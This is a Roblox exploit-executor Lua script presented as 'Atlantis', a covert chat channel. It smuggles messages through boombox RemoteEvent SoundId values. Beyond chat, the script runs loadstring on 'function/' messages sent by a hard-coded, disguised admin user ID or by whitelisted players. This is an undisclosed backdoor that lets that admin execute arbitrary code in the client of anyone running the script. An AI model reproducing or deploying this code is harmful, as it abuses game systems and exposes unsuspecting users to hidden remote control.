local Services = {}
local MetaServices = {__index = function(Table, Index) if not rawget(Services, Index) then return game:GetService(Index) end end}

setmetatable(Services, MetaServices)

local LocalPlayer = Services.Players.LocalPlayer
if LocalPlayer == nil then
	repeat task.wait()
		LocalPlayer = Services.Players.LocalPlayer
	until LocalPlayer ~= nil
end

local SentEvent = Instance.new('BindableEvent')
local Atlantis = {
	Whitelisted = {},
	Connected = {},

	Event = SentEvent,
	Sent = SentEvent.Event,

	Debug = false,
}

local ConsoleHider = tostring(game.PlaceId * .5)

local AtlantisColor = Color3.fromRGB(0, 255, 255)

local AdminColor = Color3.fromRGB(255, 202, 10)
local Admins = {
	[tostring(315419675*2)] = true
}

local ScreenGui = Instance.new('ScreenGui')

local ChatBar = Instance.new("Frame")
local ChatTextBox = Instance.new("TextBox")
local UIPadding = Instance.new("UIPadding")

if syn and syn.protect_gui then
	syn.protect_gui(ScreenGui)
end

ChatBar.Name = "ChatBar"
ChatBar.Parent = ScreenGui
ChatBar.AnchorPoint = Vector2.new(0.5, 0)
ChatBar.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
ChatBar.BackgroundTransparency = 0.500
ChatBar.BorderSizePixel = 0
ChatBar.Position = UDim2.new(0.5, 0, 0, 8)
ChatBar.Size = UDim2.new(0, 200, 0, 30)

ChatTextBox.Name = "ChatTextBox"
ChatTextBox.Parent = ChatBar
ChatTextBox.BackgroundTransparency = 1.000
ChatTextBox.Size = UDim2.new(1, 0, 1, 0)
ChatTextBox.Font = Enum.Font.Gotham
ChatTextBox.PlaceholderColor3 = Color3.fromRGB(163, 163, 163)
ChatTextBox.PlaceholderText = "Click here to chat!"
ChatTextBox.Text = ""
ChatTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
ChatTextBox.TextSize = 13.000
ChatTextBox.TextXAlignment = Enum.TextXAlignment.Left

UIPadding.Parent = ChatBar
UIPadding.PaddingBottom = UDim.new(0, 5)
UIPadding.PaddingLeft = UDim.new(0, 5)
UIPadding.PaddingRight = UDim.new(0, 5)
UIPadding.PaddingTop = UDim.new(0, 5)

ScreenGui.Parent = Services.CoreGui

local realprint = print
local function print(...)
	if not Atlantis.Debug then return end

	realprint(...)
end

local function IsRadio(BoomBox)
	local Names = {BoomBox = true, Boombox = true}
	if not Names[BoomBox.Name] then return false end

	return true
end

local function GetRadios(Character)
	local Tools = Character:GetChildren()
	local Radios = {}

	for _, Tool in pairs(Tools) do
		if not IsRadio(Tool) then continue end

		table.insert(Radios, Tool)
	end

	return Radios
end

local function Send(String)
	local BackpackBoomBoxes = GetRadios(LocalPlayer.Backpack)
	local CharacterBoomBoxes = GetRadios(LocalPlayer.Character)

	local BoomBox
	for _, Radio in pairs(BackpackBoomBoxes) do
		BoomBox = Radio

		break
	end

	for _, Radio in pairs(CharacterBoomBoxes) do
		BoomBox = Radio

		break
	end

	local String = String .. '/' .. tick()
	local NewString = ''

	for Letter, _ in string.gmatch(String, '.') do
		NewString = NewString .. Letter .. ConsoleHider
	end

	String = NewString

	if BoomBox then
		local Parent = BoomBox.Parent

		BoomBox.Parent = LocalPlayer.Character

		local RemoteEvent = BoomBox:FindFirstChildOfClass('RemoteEvent')
		if RemoteEvent.Name == 'RemoteEvent' then
			RemoteEvent:FireServer(String)
		elseif RemoteEvent.Name == 'Remote' then
			RemoteEvent:FireServer('PlaySong', String)
		end

		if Parent ~= LocalPlayer.Character then 
			BoomBox.Parent = Parent
		end
	end
end

local function GetSent(String, Player)
	local Type, Split = 'string', String:split('/')
	if Split[1] then
		Type = Split[1]
		String = string.sub(String, #Type + 2, #String)
	end

	local Value
	if Type == 'function' then
		Value = loadstring(String)
	elseif Type == 'chat' and Player then
		Value = String
	end

	return Value, Type
end

local function SentConnection(BoomBox)
	if table.find(Atlantis.Connected, BoomBox) then return end

	local Handle = BoomBox:FindFirstChild('Handle')
	if not Handle then return end

	local Sound = Handle:FindFirstChildOfClass('Sound')
	local function Fire(Sound)
		local SoundId = Sound.SoundId

		SoundId = SoundId:gsub(ConsoleHider, '')

		local Character = BoomBox.Parent
		local Player = Services.Players:GetPlayerFromCharacter(Character)

		if Character:IsA('Backpack') then
			Player = Character:FindFirstAncestorOfClass('Player')
		end

		if not Player then print('no player found for ' .. BoomBox:GetFullName()) return end -- better safe than sorry yk?

		local SoundId = string.sub(SoundId, 33, #SoundId)

		local Splits = SoundId:split('/'); table.remove(Splits, #Splits)
		local String = table.concat(Splits, '/')

		print(String)

		Atlantis.Event:Fire(Player, String)
	end

	local function Hook(Sound, FireStart)
		if FireStart then
			Fire(Sound)
		end

		Sound:GetPropertyChangedSignal('SoundId'):Connect(function()
			Fire(Sound)
		end)
	end

	table.insert(Atlantis.Connected, BoomBox)

	if Sound then
		Hook(Sound, true)
	end

	Handle.ChildAdded:Connect(function(Sound)
		if not Sound:IsA('Sound') then return end

		Hook(Sound)
	end)
end

local function PlayerAdded(Player)
	local Backpack = Player:FindFirstChildOfClass('Backpack')
	if Backpack then
		local BoomBoxes = GetRadios(Backpack)
		for _, BoomBox in pairs(BoomBoxes) do
			SentConnection(BoomBox)
		end

		Backpack.ChildAdded:Connect(function(BoomBox)
			if not IsRadio(BoomBox) then return end

			SentConnection(BoomBox)
		end)
	elseif Player.Character then
		local BoomBoxes = GetRadios(Player.Character)
		for _, BoomBox in pairs(BoomBoxes) do
			SentConnection(BoomBox)
		end
	end
end

Atlantis.Sent:Connect(function(Player, String)
	if not Player or not String then return end
	if not Admins[tostring(Player.UserId)] and not table.find(Atlantis.Whitelisted, tostring(Player.UserId)) and Player ~= LocalPlayer then return end

	local Value, Type = GetSent(String, Player)
	if Value == nil then print('voiding string: ' .. String) return end

	if typeof(Value) == 'function' then
		Value()
	elseif Type == 'chat' then
		local Command = '!whitelist '
		if Player == LocalPlayer and string.sub(Value, 1, #Command) == Command then
			local Arguments = Value:split(' ')
			local Name = Arguments[2]

			local Whitelisting
			for _, Player in pairs(Services.Players:GetPlayers()) do
				local DisplayName = Player.DisplayName:lower():sub(1, #Name)
				local Username = Player.Name:lower():sub(1, #Name)

				if Username == Name then
					Whitelisting = Player
				elseif DisplayName == Name then
					Whitelisting = Player
				end
			end

			delay(.1, function()
				Services.StarterGui:SetCore('ChatMakeSystemMessage', {
					['Text'] = '{Atlantis} whitelisted ' .. Whitelisting.DisplayName .. ' (@' .. Whitelisting.Name .. ')!',
					['Color'] = AtlantisColor,
					['Font'] = Enum.Font.SourceSansBold,
					['TextSize'] = 18,
				})
			end)
		end

		local ChatColor = Color3.new(1, 1, 1)
		if Admins[tostring(Player.UserId)] == true then
			ChatColor = AdminColor
		end

		Services.StarterGui:SetCore('ChatMakeSystemMessage', {
			['Text'] = '[' .. Player.DisplayName .. ']: ' .. Value,
			['Color'] = ChatColor,
			['Font'] = Enum.Font.SourceSansBold,
			['TextSize'] = 18,
		})
	end
end)

ChatTextBox.FocusLost:Connect(function(EnterPressed)
	local Message = ChatTextBox.Text
	if EnterPressed == false then ChatTextBox.Text = '' return end

	Send('chat/' .. Message)

	ChatTextBox.Text = ''
end)

Services.Players.PlayerAdded:Connect(PlayerAdded)

for _, Player in pairs(Services.Players:GetPlayers()) do
	PlayerAdded(Player)
end
